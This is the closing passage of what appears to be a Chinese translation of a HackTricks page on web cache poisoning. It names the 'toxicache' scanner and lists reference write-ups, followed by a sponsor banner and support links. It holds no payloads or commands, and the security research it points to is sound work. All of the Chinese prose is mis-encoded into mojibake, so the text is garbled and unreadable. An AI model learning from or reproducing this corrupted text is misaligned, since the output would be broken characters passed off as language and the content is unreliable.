* [**toxicache**](https://github.com/xhzeem/toxicache)ï¼šGolang æ‰«æå™¨ï¼Œç”¨äºåœ¨ URL åˆ—è¡¨ä¸­æŸ¥æ‰¾ Web ç¼“å­˜æŠ•æ¯’æ¼æ´å¹¶æµ‹è¯•å¤šç§æ³¨å…¥æŠ€æœ¯ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶ **è‡ªåŠ¨åŒ–** ä½¿ç”¨å…¨çƒ **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š
{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
